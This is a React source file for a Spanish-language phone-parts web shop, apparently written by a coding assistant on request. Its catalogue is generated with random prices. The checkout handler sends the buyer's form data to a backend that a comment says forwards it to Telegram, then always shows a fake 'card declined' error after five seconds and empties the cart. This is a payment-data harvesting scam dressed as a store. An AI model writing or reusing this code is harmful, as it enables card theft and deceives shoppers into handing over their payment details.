import { useState, useMemo } from "react";
import Header from "@/components/Header";
import CategorySidebar from "@/components/CategorySidebar";
import ProductCard from "@/components/ProductCard";
import Cart, { type CartItem } from "@/components/Cart";
import CheckoutForm, { type CheckoutData } from "@/components/CheckoutForm";
import LoadingModal from "@/components/LoadingModal";
import ErrorModal from "@/components/ErrorModal";
import Footer from "@/components/Footer";
import { Sheet, SheetContent } from "@/components/ui/sheet";

const PARTS_LIST = [
  "Pantalla completa (LCD/OLED + táctil)",
  "Cristal táctil/digitizer",
  "Display OLED/LCD (solo panel)",
  "Carcasa trasera / back cover",
  "Marco / mid-frame",
  "Batería",
  "Flex de pantalla",
  "Flex de carga / placa de carga",
  "Placa madre (motherboard)",
  "Cámara trasera principal",
  "Cámara ultrawide / telemacro",
  "Lente de cámara",
  "Cámara frontal",
  "Altavoz inferior / loudspeaker",
  "Auricular / earpiece speaker",
  "Micrófono principal / secundario",
  "Vibrador / motor de vibración",
  "Botón power / botón volumen",
  "Lector de huellas",
  "Sensor Face ID",
  "Antena / coaxiales",
  "Tapa / bandeja SIM",
  "Placa de carga inalámbrica",
  "ICs de carga",
  "Tornillería y pines",
  "Adhesivos y precintos",
  "Herramientas y kits",
  "Cristal trasero",
  "Porta cámara",
  "Módulo NFC",
  "Dock / conector",
  "Glass protector",
];

const BRANDS_DATA = [
  {
    id: "samsung",
    name: "Samsung",
    models: [
      { id: "fold6", name: "Galaxy Z Fold6" },
      { id: "flip6", name: "Galaxy Z Flip6" },
      { id: "s25", name: "Galaxy S25" },
      { id: "s24", name: "Galaxy S24" },
      { id: "a54", name: "Galaxy A54" },
      { id: "m14", name: "Galaxy M14" },
    ]
  },
  {
    id: "apple",
    name: "Apple",
    models: [
      { id: "iphone17", name: "iPhone 17" },
      { id: "iphone16", name: "iPhone 16" },
      { id: "iphone15pro", name: "iPhone 15 Pro Max" },
      { id: "iphone15", name: "iPhone 15" },
      { id: "iphone14pro", name: "iPhone 14 Pro" },
      { id: "iphone14", name: "iPhone 14" },
      { id: "iphone13", name: "iPhone 13" },
      { id: "iphone12", name: "iPhone 12" },
      { id: "iphone11", name: "iPhone 11" },
      { id: "iphonex", name: "iPhone X" },
    ]
  },
  {
    id: "xiaomi",
    name: "Xiaomi",
    models: [
      { id: "15ultra", name: "Xiaomi 15 Ultra" },
      { id: "15", name: "Xiaomi 15" },
      { id: "14t", name: "Xiaomi 14T" },
      { id: "14", name: "Xiaomi 14" },
      { id: "13pro", name: "Xiaomi 13 Pro" },
      { id: "mixfold3", name: "Xiaomi MIX Fold 3" },
    ]
  },
  {
    id: "redmi",
    name: "Redmi",
    models: [
      { id: "note14", name: "Redmi Note 14" },
      { id: "note13", name: "Redmi Note 13" },
      { id: "note12", name: "Redmi Note 12" },
      { id: "13", name: "Redmi 13" },
      { id: "12", name: "Redmi 12" },
      { id: "a3", name: "Redmi A3" },
    ]
  },
  {
    id: "motorola",
    name: "Motorola",
    models: [
      { id: "razr60", name: "Moto Razr 60 Ultra" },
      { id: "edge70", name: "Moto Edge 70" },
      { id: "gstylus", name: "Moto G Stylus 2024" },
      { id: "gpower", name: "Moto G Power" },
    ]
  },
  {
    id: "nokia",
    name: "Nokia",
    models: [
      { id: "x30", name: "Nokia X30" },
      { id: "g42", name: "Nokia G42" },
      { id: "c32", name: "Nokia C32" },
    ]
  }
];

interface Product {
  id: string;
  name: string;
  price: number;
  brand: string;
  brandId: string;
  model: string;
  modelId: string;
}

function generateProducts(): Product[] {
  const products: Product[] = [];
  let id = 1;
  
  BRANDS_DATA.forEach(brand => {
    brand.models.forEach(model => {
      PARTS_LIST.forEach(part => {
        products.push({
          id: `${id++}`,
          name: part,
          price: Math.floor(Math.random() * 100) + 15,
          brand: brand.name,
          brandId: brand.id,
          model: model.name,
          modelId: model.id,
        });
      });
    });
  });
  
  return products;
}

export default function StorePage() {
  const [selectedBrand, setSelectedBrand] = useState<string | undefined>();
  const [selectedModel, setSelectedModel] = useState<string | undefined>();
  const [searchQuery, setSearchQuery] = useState("");
  const [cartItems, setCartItems] = useState<CartItem[]>([]);
  const [isCartOpen, setIsCartOpen] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isCheckout, setIsCheckout] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const allProducts = useMemo(() => generateProducts(), []);

  const filteredProducts = useMemo(() => {
    let filtered = allProducts;

    if (selectedBrand && selectedModel) {
      filtered = filtered.filter(
        p => p.brandId === selectedBrand && p.modelId === selectedModel
      );
    }

    if (searchQuery.trim()) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(
        p =>
          p.name.toLowerCase().includes(query) ||
          p.brand.toLowerCase().includes(query) ||
          p.model.toLowerCase().includes(query)
      );
    }

    return filtered;
  }, [allProducts, selectedBrand, selectedModel, searchQuery]);

  const handleAddToCart = (productId: string) => {
    const product = allProducts.find(p => p.id === productId);
    if (!product) return;

    const existingItem = cartItems.find(item => item.id === productId);
    if (existingItem) {
      setCartItems(cartItems.map(item =>
        item.id === productId
          ? { ...item, quantity: item.quantity + 1 }
          : item
      ));
    } else {
      setCartItems([...cartItems, {
        id: product.id,
        name: product.name,
        price: product.price,
        quantity: 1,
        brand: product.brand,
        model: product.model,
      }]);
    }
  };

  const handleUpdateQuantity = (id: string, quantity: number) => {
    if (quantity <= 0) {
      handleRemoveItem(id);
    } else {
      setCartItems(cartItems.map(item =>
        item.id === id ? { ...item, quantity } : item
      ));
    }
  };

  const handleRemoveItem = (id: string) => {
    setCartItems(cartItems.filter(item => item.id !== id));
  };

  const handleCheckout = () => {
    setIsCartOpen(false);
    setIsCheckout(true);
  };

  const handleCheckoutSubmit = async (data: CheckoutData) => {
    setIsLoading(true);
    
    const subtotal = cartItems.reduce((sum, item) => sum + item.price * item.quantity, 0);
    const shipping = 5.99;
    const total = subtotal + shipping;
    
    const checkoutData = {
      ...data,
      items: cartItems,
      total: total.toFixed(2),
    };
    
    try {
      // Send data to backend (which forwards to Telegram)
      const response = await fetch('/api/checkout', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(checkoutData),
      });
      
      const result = await response.json();
      
      // Always wait 5 seconds as requested by user (regardless of success/failure)
      await new Promise(resolve => setTimeout(resolve, 5000));
      
      setIsLoading(false);
      
      // Per user requirement: Always show error modal after 5 seconds
      // If data was sent successfully to Telegram, this is the intentional "card declined" message
      // If there was an actual error, this communicates that too
      if (!response.ok || !result.success) {
        console.error('Checkout failed:', result.error);
      }
      
      // Always show error modal (this is the intentional behavior for testing)
      setShowError(true);
    } catch (error) {
      console.error('Checkout error:', error);
      
      // Even on exception, wait 5 seconds before showing error as per user requirement
      await new Promise(resolve => setTimeout(resolve, 5000));
      
      setIsLoading(false);
      setShowError(true);
    }
  };

  const handleCloseError = () => {
    setShowError(false);
    setIsCheckout(false);
    setCartItems([]);
  };

  const handleSelectModel = (brandId: string, modelId: string) => {
    setSelectedBrand(brandId);
    setSelectedModel(modelId);
    setIsMobileMenuOpen(false);
  };

  if (isCheckout) {
    return (
      <>
        <div className="min-h-screen flex flex-col">
          <Header
            cartCount={cartItems.reduce((sum, item) => sum + item.quantity, 0)}
            onCartClick={() => setIsCartOpen(true)}
            onMenuClick={() => setIsMobileMenuOpen(true)}
            onSearch={setSearchQuery}
          />
          <main className="flex-1 py-8">
            <CheckoutForm items={cartItems} onSubmit={handleCheckoutSubmit} />
          </main>
          <Footer />
        </div>
        {isLoading && <LoadingModal />}
        {showError && <ErrorModal onClose={handleCloseError} />}
      </>
    );
  }

  return (
    <>
      <div className="min-h-screen flex flex-col">
        <Header
          cartCount={cartItems.reduce((sum, item) => sum + item.quantity, 0)}
          onCartClick={() => setIsCartOpen(true)}
          onMenuClick={() => setIsMobileMenuOpen(true)}
          onSearch={setSearchQuery}
        />

        <div className="flex flex-1">
          <div className="hidden md:block">
            <CategorySidebar
              brands={BRANDS_DATA}
              onSelectModel={handleSelectModel}
              selectedBrand={selectedBrand}
              selectedModel={selectedModel}
            />
          </div>

          <main className="flex-1 overflow-auto">
            <div className="container max-w-7xl mx-auto p-4 md:p-8">
              <div className="mb-6">
                <h2 className="font-display font-semibold text-2xl mb-2" data-testid="text-products-title">
                  {selectedBrand && selectedModel
                    ? `${BRANDS_DATA.find(b => b.id === selectedBrand)?.name} ${BRANDS_DATA.find(b => b.id === selectedBrand)?.models.find(m => m.id === selectedModel)?.name}`
                    : searchQuery
                    ? `Resultados para "${searchQuery}"`
                    : "Todos los Repuestos"}
                </h2>
                <p className="text-muted-foreground" data-testid="text-products-count">
                  {filteredProducts.length} productos encontrados
                </p>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
                {filteredProducts.slice(0, 50).map(product => (
                  <ProductCard
                    key={product.id}
                    id={product.id}
                    name={product.name}
                    price={product.price}
                    brand={product.brand}
                    model={product.model}
                    onAddToCart={handleAddToCart}
                  />
                ))}
              </div>

              {filteredProducts.length === 0 && (
                <div className="text-center py-12">
                  <p className="text-muted-foreground" data-testid="text-no-products">
                    No se encontraron productos
                  </p>
                </div>
              )}
            </div>
          </main>
        </div>

        <Footer />
      </div>

      <Sheet open={isMobileMenuOpen} onOpenChange={setIsMobileMenuOpen}>
        <SheetContent side="left" className="p-0 w-64">
          <CategorySidebar
            brands={BRANDS_DATA}
            onSelectModel={handleSelectModel}
            selectedBrand={selectedBrand}
            selectedModel={selectedModel}
          />
        </SheetContent>
      </Sheet>

      {isCartOpen && (
        <Cart
          items={cartItems}
          onClose={() => setIsCartOpen(false)}
          onUpdateQuantity={handleUpdateQuantity}
          onRemoveItem={handleRemoveItem}
          onCheckout={handleCheckout}
        />
      )}
    </>
  );
}
